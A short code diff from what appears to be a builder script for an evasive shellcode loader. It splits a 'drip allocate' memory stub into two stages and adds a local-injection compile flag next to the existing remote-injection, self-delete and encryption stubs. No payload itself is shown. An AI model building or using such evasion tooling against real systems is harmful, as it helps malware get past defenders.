@@ -2348,7 +2348,7 @@ if(jmpEntry):
     stub.add(CustomThreadEntryStub)
 
 if(dripallocate):
-    stub.add(DripAllocateStub)
+    stub.add(DripAllocateStubFirst)
 
 stub.add(MainStub)
 
@@ -2384,6 +2384,9 @@ stub.add(getRandStub())
 stub.add(Cryptstub3)
 stub.add(getRandStub())
 stub.add(getRandStub())
+
+if(dripallocate):
+    stub.add(DripAllocateStubSecond)
 
 if (selfdelete):
     stub.add(FileDeleteStub)
@@ -2749,7 +2752,8 @@ if(gosleep):
 
 if(remoteinject):
     basicCompileFlags.add("-d:remoteinject ")
-
+else:
+    basicCompileFlags.add("-d:localinject ")
 if(remoteMapSection):
     basicCompileFlags.add("-d:remoteMapSection ")
 
